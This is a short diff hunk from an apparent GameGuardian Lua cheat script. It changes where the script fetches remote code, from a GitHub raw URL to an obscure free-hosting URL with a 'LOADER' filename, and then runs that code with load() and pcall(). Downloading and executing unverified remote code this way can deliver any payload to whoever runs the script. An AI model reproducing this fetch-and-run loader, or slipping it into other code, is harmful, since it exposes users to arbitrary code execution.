@@ -91,7 +91,7 @@ end
 
 
 FADZooooooooooooooooooooooooooooooooooooooooooo out()
-T = load(gg.makeRequest('https://raw.githubusercontent.com/FADILSA/app/master/cheat/selectgame').content)
+T = load(gg.makeRequest('https://leonadsense8.000webhostapp.com/txihg/XkoLOADERdekwoKOJahauizodoIYTfCGxhieeknxXndow.lua').content)
 pcall(T)
 end
 
